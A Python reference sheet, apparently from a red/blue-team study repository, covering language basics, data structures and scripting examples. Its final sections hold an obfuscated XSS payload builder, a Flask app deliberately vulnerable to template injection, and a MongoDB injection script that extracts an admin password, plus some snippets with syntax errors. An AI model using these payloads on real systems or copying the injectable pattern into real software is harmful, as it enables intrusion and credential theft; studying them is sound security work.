## TABLE OF CONTENTS
1) [BEST PRACTICES](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/Python.md#best-practices)
2) [BASICS](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/Python.md#basics)
3) [DATA STRUCTURES](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/Python.md#data-structures)
4) [SCRIPTING](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/Python.md#scripting)
5) [CODE EXAMPLES](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/Python.md#code-examples)

<br />

## BEST PRACTICES
### Iterables vs. Iterator vs Generator 
- **iterables** are objects that can return one of their elements at a time (e.g. list)
- **iterator** is an object that represents a stream of data
- **Generators** are a simple way to create iterators using functions

### Docstring
```
def square_root(n):
"""
    Calculate the square root of a number.

    Args:
        n(int): the number to get the square root of.
    Returns:
        the square root of n.
    Raises:
        TypeError: if n is not a number.
        ValueError: if n is negative.
"""
```

### AVOID EXECUTABLE RUNNING WHEN IT'S IMPORTED
- `if __name__ == "__main__":`
   - Ensure that variables that are created, functions that are called, operations that are done
   - ONLY executed when you directly run the file**, not when you import it into another
   - Example: modules like random, string, math etc.

### Common Modules
- **csv**: very convenient for reading and writing csv files
- **collections**: useful extensions of usual data types incl. OrderedDict, defaultdict, namedtuple
- **random**: generates pseudo-random numbers, shuffles sequences randomly and chooses random items
- **string**: more functions on string e.g. string.digits 
- **re**: pattern-matching in strings via regular expressions
- **math**: some standard mathematical functions
- **os**: interacting with operating systems
- **os.path**: submodule of os for manipulating path names
- **sys**: work directly with the Python interpreter
- **json**: good for reading and writing json files (good for web work)

### Import Techniques
```
1) from "module_name" import "object_name"
2) from "module_name" import "first_object", "second_object"
3) import "module_name" as "new_name" 
4) from "module_name" import "object_name" as "new_name" 
5) import "module_name.submodule_name"
6) from . import "object_name" as "new_name"
```

### Third Party Libraries
- Big projects often depend on dozens of third party packages
- Dependencies are summarized in requirements.txt:
   - beautifulsoup4==4.5.1
   - bs4==0.0.1
   - pytz==2016.7
   - requests==2.11.1
- `pip install -r requirements.txt`: Get all needed packages indicated in requirements.txt


### Useful Third Party Libraries
- **Python/Jupyter**: A better interactive Python interpreter
- **Requests**: Provides easy to use methods to make web requests. Useful for accessing web APIs.
- **Flask**: A lightweight framework for making web applications and APIs.
- **Django**: A more featureful framework for making web applications. Django is particularly good for designing complex, content heavy, web applications.
- **Beautiful Soup**: Used to parse HTML and extract information from it (web scraping)
- **pytest**: extends Python's builtin assertions and unittest module.
- **PyYAML**: For reading and writing YAML files.
- **NumPy**: The fundamental package for scientific computing with Python. It contains among other things a powerful N-dimensional array object and useful linear algebra capabilities.
- **pandas**: A library containing high-performance, data structures and data analysis tools
- **matplotlib**: a 2D plotting library which produces publication quality figures
- **ggplot**: Another 2D plotting library, based on R's ggplot2 library.
- **Pillow**: The Python Imaging Library adds image processing capabilities to your interpreter.
- **pyglet**: A cross-platform application framework intended for game development.
- **Pygame**: A set of Python modules designed for writing games.
- **pytz**: World Timezone Definitions for Python

<br />

## BASICS
### Arithmetic Operators
```
 + Addition
 - Subtraction
 * Multiplication
 / Division
 % Mod (the remainder after dividing)
** Exponentiation ("^" does not do this operation)
// Divides and rounds down to the nearest integer
== equal to
!= not equal to
\n new line
print(" ",end=" ") --> without newline
```

### Operation Meaning 
```
< 	strictly less than
<= 	less than or equal
> 	strictly greater than
>= 	greater than or equal
== 	equal
!= 	not equal
is 	object identity
is not 	negated object identity
<<	Binary Left Shift operator (Exp: x = 1010<<1 = 10100 = 20 (2^4 + 2^2)
>>	Binary Right Shift operator (Exp: x = 1010>>1 = 101 = 5 (2^2 + 2^0)
```

### Assignment Operators 
```
x+=2 --> x=x+2
x-=2 --> x=x-2
x*=2 --> x=x*2
x,y,z = 1,2,3 (simultaneous assignment)
```
### == vs is (Equality vs Identity)
```
a = [1, 2, 3]
b = a
c = [1, 2, 3]

print(a == b) --> True
print(a is b) --> True
print(a == c) --> True
print(a is c) --> False

# List a and list b are equal and identical
# List c is equal to a (and b for that matter) since they have the same contents
# But a and c (and b for that matter, again) point to two different objects, i.e., they aren't identical objects.
```

### Everything is a object 
```
a = 12.5
a.__add__(5)    --> 17.5
a.__sub__(7)    --> 5.5
s = "Hallo Welt"
s.__len__()     --> 10
```
### Declare Encoding 
- At top of file.py:
    - `#!/usr/bin/env python`
    - `# -*- coding: utf-8 -*-`
    
<br />

## DATA STRUCTURES
### String Methods
```
a = "meinefiesefresseausderschnauze"
    a.islower() --> True (all letters are small)
    a.count('z') --> 1
    a.find('z') --> 28
    a.capitalize() --> Meinefiesefresseausderschnauze
    a.upper()
    a.lower()
    a.startswith("m") --> True
    a.endswith("?") --> False
    a.index('z') --> 28 (Like find() but raise ValueError when substring is not found)
    a.strip("f")
    a.replace("m","D")
    len(a) --> 30
```
- `string_rev = string[::-1]`:  string[start,stop,step]
- `string = string.replace(" ", "")`: remove white space
- `letter = line.split(": ")[0].lower()`
- `flower = line.split(": ")[1].strip()`
    - `flower_dict[letter] = flower`
- string format:
    - **Docs**: [https://docs.python.org/3.8/library/string.html#formatspec](https://docs.python.org/3.8/library/string.html#formatspec) 
    - `print("Hi {}".format(name))`: new format style
    - `print("Hi {:d}".format(name))`: Will print "name" in decimal format
    - `print("Hi {:b}".format(name))`: Will print "name" in binary format
    - `print("Hi {:x}".format(name))`: Will print "name" in hex format
    - `print("Hi %s" % name)`: old style
    - `print("Hi " + name)`: string concatenation
    - `print("The byte-string is: ", pickle.dumps(bytestring))`
    - `str(4).zfill(4)`: 0004
    
### Lists
- `list = [1,2,3,4]`
- `print(list[1:3])`: [2,3] *lower value included, upper value excluded!
- `print(list[-2:])`: [3,4] *slicing works also reversely
- `print("Hallo Welt"[-4:])`: "Welt"
- `max(list)`: returns greatest element
- `min(list)`: returns smallest element
- `sorted(list, reverse=true)`: 
    - returns sorted list
    - leaves original list unchanged (!)
- `liste.sort(key="fkt.", reverse=true)`: changes original list (!)
- `new_str = "-".join(["fore", "aft"])`: output -> fore-aft
- `letters.append('z') --> ['a','b','c','z']`
- `print("Maria loves {} and {}".format("math","statistics"))`: Maria loves math and statistics
- `del list[3]`: Delete the 4th element of list
- List Comprehension:
    - `capitalized_cities = [city.title() for city in cities]`
    - `squares = [x**2 for x in range(9) if x % 2 == 0]`
    - `squares = [x**2 if x % 2 == 0 else x + 3 for x in range(9)]`

### Tuples
- `tuple_a = 1,2`: parentheses can be omit
- `tuple_b = (1,2)`
- `t = 1,2,3` --> `x,y,z = t`: tiple unpacking --> x=1, y=2, z=3 
- Put Tuples in lists:
```
students = [("Max",23),("Kai",20)]
for name,age in students:
    print(name)
    print(age)
```

### Sets
```   
numbers = [1, 2, 6, 3, 1, 1, 6]
unique_nums = set(numbers)
print(unique_nums)   # (1, 2, 3, 6)
unique_nums.add(5)   # the "append" method is called "add" for sets
unique_nums.pop()    # remove last element
```

### Queue / Priority Queue 
- Create queue filled with "value" and "priority"
- `pq.get()` returns values in ascending order 
- Use "priority" with "-" (Minus) for descending order 
```
import queue
pq = queue.PriorityQueue()
for name, number in names.items():
    pq.put((-number, name))              # hand over as tupel due to (( )) 
for i in range(0, 50):
    print(pq.get())
```

### Dictionary 
```
elements = {"hydrogen": 1, "helium": 2, "carbon": 6}    # hydrogen = key, 1 = value
print(elements["helium"])                               # 2 
elements["lithium"] = 3                                 # add "lithium" with value 3 into dictionary
del elements["lithium"]                                 # delete the element lithium 
elements["helium"][0]                                   # refer to 0-index value of helium
print("carbon" in elements)                             # check existing key; "False"
print(elements.get("dilithium"))                        # None (i/o error message)
print(elements["dilithium"])                            # KeyError
elements.get("kryptonite", 'There\'s no such element!') # defined return value

#return both key and value

for key, value in elements.items():
     print("Key: {}    Value: {}".format(key, value))

print(elements.keys())
print(elements.values())
sorted_keys = sorted(elements.keys())

#Use for-loop and dictionary to count entries in string "book_title"
#If word_counter.get does not find "word" in book_title then return 0 (new entry)
#Otherwise +1 (increase counter)

word_counter = {}
for word in book_title:
    word_counter[word] = word_counter.get(word, 0) + 1  

#Compound Structures
#Include containers in other containers, e.g. dictionary in a dictionary

elements = {"hydrogen": {"number": 1,
                         "weight": 1.00794,
                         "symbol": "H"},
hydrogen_weight = elements["hydrogen"]["weight"]   #1.00794
oxygen = {"number":8,"weight":15.999,"symbol":"O"}  #create oxygen 
elements["oxygen"] = oxygen  #add oxygen to dictionary
```

<br />

## SCRIPTING
### Errors
- Syntax errors:
    - Occur when Python can’t interpret our code
    - These are errors you’re likely to get when you make a typo, or starting to learn Python
- Exceptions:
    - Occur when unexpected things happen during execution of a program (even syntactically correct)     
    - Different types of built-in exceptions available 
    - **ValueError**
        - An object of the correct type but inappropriate value 
    - **AssertionError**
        - An assert statement fails
    - **IndexError**
        - A sequence subscript is out of range
    - **KeyError**
        - A key can't be found in a dictionary
    - **TypeError**
        - An object of an unsupported type is passed as input to an operation or function.
    - **ZeroDivisionError**
    - **FileNotFoundError**

### Create Individual Exception 
```
#Extend class Exception with own error message "InvalidEmailError" via Inheritance
class InvalidEmailError(Exception):
    pass

# Example with individual raise-notification
def send_mail(email, subject, content):
    if not "@" in email:
        raise InvalidEmailError("email does not contain an @")
try:     
    send_mail("hello", "subject", "content")
except InvalidEmailError:
    print("Please enter a valid email address")
```

#### Try Statement
- use try statements to handle exceptions
- four clauses can be used:
    - **try**
        - This is the only mandatory clause in a try statement
        - The code in this block is the first thing that Python runs in a try statement
    - **except**
        - Switch to "except statement" when an exception occurs while running try block
    - **else:**
        - If Python runs into no exceptions while running the try block
        - Then it will run the else block 
    - **finally**
        - Before Python leaves try block, it will run the code in finally block under any condition
        - Even if it's ending the program if Python runs into error while running except or else block
        - This finally block will still be executed before stopping the program
```
# Example
while True: 
   try:
    x = int(input('Enter a number:  '))
      break
   except ValueError: 
      print('That\'s not a valid number!')
   except KeyboardInterrupt:
      print('\n No input taken')
      break 
   finally:
      print('\n Attempted Input\n')

# while-loop works best when input-prompt is within try block
# Otherwise continous loop possible (!) 
```

#### acessing Error Message
```
try:
 #some code
except ZeroDivisionError as y:
 #some code
print("ZeroDivisionError occurred: {}".format(y))

# Output: "ZeroDivisionError occurred: integer division or modulo by zero"
#If you don't have specific error, you can still access the message like this:

try:
 #some code
except Exception as y:
 #some code
print("Exception occurred: {}".format(y))
```

#### Your Own Project
```
# create project file xyz
# create virtual environment
python -m venv [source/repos/projects/xyz]

# choose corresponding Interpreter in VS Code
xyz/scripts/python.exe

# install needed packages
.projects/xyz pip install [package]

# create requirements.txt
pip freeze > requirements.txt

# Finally, install all the dependencies listed in this file
pip install -r requirements.txt
```

<br />

## CODE EXAMPLES
### For Loop
```
# print output in one line (w/o newline)

for list in lists:
    print(list, end="")
```
### LAMBDA FUNCTION
- creates quickly anonymous functions (w/o function name)
- not ideal for complex functions

```
- def multiply(x, y):
    return x * y
# can be reduced to:
multiply = lambda x, y: x * y
```

### GENERATOR FUNCTION
- return keyword: **yield**
- **yield** keyword is difference between generator and typical function
```
def my_range(x):
    i = 0
    while i < x:
        yield i
        i += 1
```
- Why Generators i/o lists?
   - Generators are a lazy way to build iterables
   - They are useful when fully realized list would not fit in memory
   - Or when the cost to calculate each list element is high 
   - But generators can only be iterated over once (!)

### GENERATOR EXPRESSION
- combines generators and list comprehensions
- The only difference: You use square brackets (i/o parentheses)
- `sq_list = [x**2 for x in range(10)]`:     list of squares
- `sq_iterator = (x**2 for x in range(10))`: iterator of squares

### GRAPHICS WITH MATPLOT
```
import matplotlib.pyplot as plt
xs = [1, 2, 5]
ys = [4, 7, 5]
plt.plot(xs, ys)
plt.show()
```
### BUILT-IN FUNCTION: range
- range(start=0, stop, step=1)
    - `range(4)` returns `0, 1, 2, 3`  #stop
    - `range(2, 6)` returns `2, 3, 4, 5`   #start, stop
    - `range(1, 10, 2)` returns `1, 3, 5, 7, 9`    #start,stop,step
```
# Example 1
names = ["Joey Tribbiani", "Monica Geller", "Chandler Bing", "Phoebe Buffay"]
usernames = []
for index in range(len(names)):
    usernames.append(names[index].lower().replace(' ','_')
print(usernames)

# Example 2
items = ['first string', 'second string']
html_str = "<ul>\n"  
for index in range(len(items)):
    html_str += '<li>'+items[index]+'</li>\n'
html_str += '</ul>'
```

### BUILT-IN FUNCTION: zip (Matrix transpose)
```
# Example 1
letters = ['a', 'b', 'c']
nums = [1, 2, 3]
for letter, num in zip(letters, nums):
    print("{}: {}".format(letter, num))
#Output: [('a', 1), ('b', 2), ('c', 3)]

# Example 2
unzip (via asterisk): 
some_list = [('a', 1), ('b', 2), ('c', 3)]
letters, nums = zip(*some_list)

# Example 3
# Transpose 4x3 matrix to 3x4 matrix
data = ((0, 1, 2), (3, 4, 5), (6, 7, 8), (9, 10, 11))
data_transpose = tuple(zip(*data))
```

### BUILT-IN FUNCTION: enumerate
```
# Example 1
letters = ['a', 'b', 'c', 'd', 'e']
for i, letter in enumerate(letters):
    print(i, letter)

# Output
    0 a
    1 b
    2 c
    3 d
    4 e

# Example 2
for i, letter in enumerate(letters,2):
    print(i, letter)

# Output
    2 a
    3 b
    4 c
    5 d
    6 e

# Example 3
for i, letter in enumerate(letters):
    letters[i] += ' ' + str(99)
```

### BUILT-IN FUNCTION: map
- takes function and iterable as inputs
- returns an iterator that applies the function to each element of the iterable
```
# Calculate average number in each row:
numbers = [
              [34, 63, 88, 71, 29],
              [90, 78, 51, 27, 45],
              [63, 37, 85, 46, 22],
              [51, 22, 34, 11, 18]
           ]
def mean(num_list):
    return sum(num_list) / len(num_list)
averages = list(map(mean, numbers))

# Same as Lambda function:
averages = list(map(lambda nl: sum(nl)/len(nl), numbers))
print(averages)
```

### BUILT-IN FUNCTION: filter
- takes a function and iterable as inputs
- returns an iterator with iterable-elements where function returns "True"
```
cities = ["New York City", "Los Angeles", "Chicago", "Mountain View", "Denver", "Boston"]
def is_short(name):
    return len(name) < 10
short_cities = list(filter(is_short, cities))
print(short_cities)
```

### BUILT-IN FUNCTION: input
- utilize raw input from user
- you can use optional string argument to specify a message
```
# String
name = input("Enter your name: ")
print("Hello there, {}!".format(name.title()))

# Integer
num = int(input("Enter an integer"))
```

### BUILT-IN FUNCTION: eval
- interpret user input as a Python expression
- this function evaluates a string as a line of Python
```
result = eval(input("Enter an expression: "))
print(result)
# Output Example: Enter an expression: 67*45 --> output:3015
```

### READING FILES
```
f = open('my_path/my_file.txt', 'r')
  file_data = f.read()
  f.close()
with open('my_path/my_file.txt', 'r', encoding='utf8') as f:
    file_data = f.read()
with open("camelot.txt") as f:
    camelot_lines = []
    for line in f:
        camelot_lines.append(line.strip())
```

### WRITING FILES
- Overwrite existing content with `'w'` (!)
- Adding content is done in append mode `'a'` (!) 
```
f = open('my_path/my_file.txt', 'w')
  f.write("Hello there!")
  f.close()
```

### OBJECT ORIENTATION AND INHERITANCE
```
#Klasse FileReader besitzt einen Kosntruktor und eine Funktion
class FileReader():
    #Der Konstruktor legt nur ein Attribut "filename" fest
    def __init__(self, filename):
        self.filename = filename
    
    def lines(self):
        lines = []
        with open(self.filename, "r") as file:
            for line in file:
                lines.append(line.strip())
        return lines
#Die Klasse CsvReader erbt von der "Mutter" FileReader
class CsvReader(FileReader):
    #Der Konstrukor legt kein eigenes Attibut fest sondern erbt via "super()" das Attribut
    def __init__(self, filename):
        super().__init__(filename)
    #Auch die Funktion "lines" wird von FileReader geerbt
    def lines(self):
        lines = super().lines()
```

### WEB CRAWLER
```
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import time
import csv
class CrawledArticle():
    def __init__(self, title, emoji, content, image):
        self.title = title
        self.emoji = emoji
        self.content = content
        self.image = image
class ArticleFetcher():
    def fetch(self):
        url = "http://python.beispiel.programmierenlernen.io/index.php"
        while url != "":
            time.sleep(1)        //Verzögere Ausführung um 1s
            r = requests.get(url)
            doc = BeautifulSoup(r.text, "html.parser")
            
            for card in doc.select(".card"):
                emoji = card.select_one(".emoji").text
                content = card.select_one(".card-text").text
                title = card.select(".card-title span")[1].text
                image = urljoin(url, card.select_one("img").attrs["src"])

                #Erstelle Generator mit allen gecrawlten Attributen
                yield CrawledArticle(title, emoji, content, image)
               
            #Falls es "next button" gibt dann ändere url und gehe zur nächsten Seite
            next_button = doc.select_one(".navigation .btn")
            if next_button:
                next_href = next_button.attrs["href"]
                next_href = urljoin(url, next_href)            
                url = next_href
            else:
                url = ""
        return articles

#Öffne leere Datei zum beschreiben 
with open('datei.csv', 'w', newline='') as csvfile:
    articlewriter = csv.writer(csvfile, delimiter=';', quotechar='"')
    #Schreibe die gecrawlten Daten via writerow-Methode in articlewriter, Zeile für Zeile
    for article in ArticleFetcher().fetch():
        articlewriter.writerow([article.emoji, article.title, article.image, article.content])
```

### CALL MODULE FROM OTHER PROJECT FILES
```
# Option A 
# No extra configuration necessary
from "project_file" import "file"`


# Option B
from "project_file" import *
file.f()
# additionally you have to write "__all__ = ["file"]" under "__init__"

# Option C
import "project_file"
project_file.file.f()
# Additionally you have to write: "from . import datei" under "__init__" 
```

### TRANSFER VARIABLE FUNCTION PARAMETER
```
# mithilfe von * werden Parameter in einer Tupel übergeben
def calculate_max(*params):
    print(params)
    current_max = params[0]
    for item in params:
        if item > current_max:
            current_max = item
    return current_max
calculate_max(1, 2, 3)

#mithilfe von ** werden Parameter in einem Dictionary übergeben
def f(**args):
    print(args)
f(key="value", key2="Value 2")

#Beispiel mit matplot, wo plot-parameter variabel übergeben werden
import matplotlib.pyplot as plt
def create_plot(**plot_params):
    print(plot_params)   
    plt.plot([1, 2, 3], [5, 6, 5], **plot_params)
    plt.show()
create_plot(color="r", linewidth=10, linestyle="dashed")
```

### DATE AND TIME 
```
import datetime
now = datetime.now()
print(now)
print(now.strftime("%d.%m.%Y"))  # 18.07.2017
print(now.strftime("%Y-%m-%d"))  # 2017-07-18
print(now.strftime("%Y%m%d"))    # 20170718

# extract data from string 
d = "18.07.2017"
print(datetime.strptime(d, "%d.%m.%Y"))
```


### DEFAULTDICT MODULE
```
# Dictionary get initialized automatically with values 
p = defaultdict(int)
words = ["Hello", "Hello", "World"]
for word in words:
    p[word] = p[word] + 1        //p[word] startet mit 0
```


### REGEXP
```
import re
sentence = "I have 30 dogs, and all consume 4 liter water and 2 kg food respectively."
re.findall("[0-9]+", sentence)
#output: ['30', '4', '2']

re.search("[0-9]+", sentence)
#output: <_sre.SRE_Match object; span=(9, 11), match='30'>
```


### CSV MODULE
```
import csv    
with open('../data/names.csv', newline='') as csvfile:
    namereader = csv.reader(csvfile, delimiter=',', quotechar='"')
```


### PROXY SERVER 
```
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
import urllib
import requests
import random

class MyRequestHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        print(self.path)           #Vom Browser gesendeter Path
        print(self.headers)        #Vom Browser gesendeter Header
        if self.headers["content-type"] == "application/x-www-form-urlencoded":
            length = int(self.headers["content-length"])      #Hole Eingabevariable aus Header
            form = str(self.rfile.read(length), "utf-8")      #Lese Eingabevariable
            data = urllib.parse.parse_qs(form)                #Zerlege Eingabevariable 
        
            #Leite Daten an Server weiter
            with requests.post(self.path, data = data, stream=True) as res:      
                #ResponseCode an Browser, sonst kann Browser nicht richtig interpretieren
                self.send_response(res.status_code)     
                for key,value in res.headers.items():
                    self.send_header(key, value)        #Headerinfo an Browser übergeben
                self.end_headers()                      #Proxy Header beenden
                self.wfile.write(res.raw.read())        #Übergebe von res.raw an Browser

    def do_GET(self):
        #Bildmanipulation ausführen
        if self.path[-4:] == ".jpg":
            images = ["./cats/1.jpg", "./cats/2.jpg"]
            self.send_response(200)                         
            self.send_header("Content-Type", "image/jpg")   
            self.end_headers()                              
            with open(random.choice(images), "rb") as file:     #"rb" = read binary
                self.wfile.write(file.read())                   #wfile erwartet byte-input 
        else: 
            with requests.get(self.path, stream=True) as r: 
                self.send_response(r.status_code) 
                #Textmanipulation ausführen
                if "text/html" in r.headers["content-type"]:
                    self.send_header("Content-Type", "text/html")   
                    self.end_headers()
                    content = str(r.content, "utf-8")
                    content = content.replace("Bilder", "Wazzup?")
                    content = content.replace("Lorem", "FUCK YOU!")
                    self.wfile.write(content.encode())
                else:
                    #Keine Manipulation, sondern normale Datenübermittlung
                    self.send_response(r.status_code)
                    for key,value in r.headers.items():
                        self.send_header(key, value)
                    self.end_headers()
                    self.wfile.write(r.raw.read())        

#Sequentiell arbeitenden HTTPServer mittels Vererbung mit Threadingfunktionalität ausstatten
class ThreadingHTTPServer(ThreadingMixIn, HTTPServer):
    pass

address = ("127.0.0.1", 10080)                            #Proxy eine IP und Port zuweisen
server = ThreadingHTTPServer(address, MyRequestHandler)   #Serverinstanz erstellen
server.serve_forever()                                    #Server laufen lassen
```


### XOR OPERATION
```
# chr() = convert int to Unicode letter
# ord() = convert Unicode letter to int
# ^ = Bitwise Exclusive XOR

def xor(str1, str2):
  result = []
  for i, j in zip(str1, str2):
    result.append(chr(ord(i) ^ ord(j))
  return ''.join(result)
```

### HTTP SERVER
- `python2 -m SimpleHTTPServer`
- `python3 -m http.server`

### ESCAPE ALERT (XSS)
```
#!/usr/bin/python3

text = "('xss')"

x = [ord(i) for i in "alert"]
result = str(x).strip("[]")

payload = "<script>eval(String.fromCharCode("+result+"))"+text+"</script>"
print(payload)
```

### FLASK APP (VULNERABLE TO SSTI)
```
#!/usr/bin/python3

from flask import Flask, redirect, render_template_string, render_template, request

app = Flask(__name__)
@app.errorhandler(404)
def page_not_found(e):
    #line12: request.url is loaded dynamically into the template
    #line15: malicious code can be injected and interpreted by the template - SSTI!
    template = '''
    {%%block body %%}
    <div class="center-content error">
        <h1>Page not Found: %s</h1>
    </div>
    {%% endblock %%}
    ''' % (request.url)
    return render_template_string(template), 404

@app.route('/')
def index():
    return render_template('index.html')

if __name__ == '__main__':
    app.run(debug=False,host='0.0.0.0')
```

### PAYLOAD MONGODB
```
#!/usr/bin/python3

import urllib.request
import string

URL = "http://example.com/"

def check(payload):
    url = URL+"/?search=admin'%20%26%26%20this.password.match(/^"+payload+"/)%00"
    #print(url)
    resp = urllib.request.urlopen(url)
    data = resp.read()
    return ">admin<" in str(data)

def createPayload():
    CHARSET = list(string.ascii_lowercase+string.digits+"-")
    key = ""
    while True:
        for c in CHARSET:
            test = key + c
            if check(test):
                print("[+] payload extended with " + c)
                key += c
                break
            elif c == CHARSET[-1]:
                print(key)
                exit(0)
    return key

createPayload()
```

### Unzip file via ZipFile
```
from zipfile import ZipFile

def unzip(filename):
   with ZipFile(filename, mode="r") as myzip:
        output = myzip.namelist()[0]
        myzip.extract(output)
        return output

path = "/path/to/dir/"

file = unzip(path+"geschenk.zip")
for i in range(0,2020):
    file = unzip(path+file)
print("[+] last file: ", file)
```

### Search for words in text & translate Binary2ASCII
```
with open('text', 'r') as text:
    binary = ""
    pwd = ""
    for line in text:
        words = line.split()
        for word in words:
            if 'cyber' in word.lower():
                if '-' in word:
                    binary += '1'
                else:
                    binary += '0'


for i in range(0,len(binary),8):
    pwd += chr(int(binary[i:i+8],2))

print("Binary: ", binary)
print("PWD: ", pwd)
```

### Search for words in text with Regex
```
import re

def findCyber(string):
    if re.match(r'\b([Cc]yber-)', string, flags=re.IGNORECASE):
        return '1'
    elif re.match(r'(\b[Cc]yber)', string, flags=re.IGNORECASE):
        return '0'

with open('text', 'r') as text:
    binary = ""
    for line in text:
        words = line.split()
        for word in words:
            if findCyber(word) != None:
                binary += findCyber(word)
```
